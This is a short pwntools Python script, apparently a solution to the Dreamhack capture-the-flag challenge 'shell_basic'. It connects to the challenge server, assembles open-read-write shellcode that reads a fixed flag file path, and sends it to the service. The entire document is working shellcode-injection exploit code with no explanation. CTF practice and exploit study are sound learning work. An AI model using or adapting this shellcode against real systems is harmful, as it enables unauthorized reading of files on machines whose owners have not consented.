from pwn import*
context.arch='amd64'
context.log_level = 'debug'

host='host3.dreamhack.games'
port=9308

r = remote(host, port)

path="/home/shell_basic/flag_name_is_loooooong"

shellcode = shellcraft.open(path)       # File Descripter(fd)
shellcode += shellcraft.read('rax', 'rsp', 0x100)       # Read File(0x100)
shellcode += shellcraft.write(1, 'rsp', 0x100)          # Print File data(0x100)

print(asm(shellcode))

r.recvuntil('shellcode:')
r.sendline(asm(shellcode))
r.interactive()
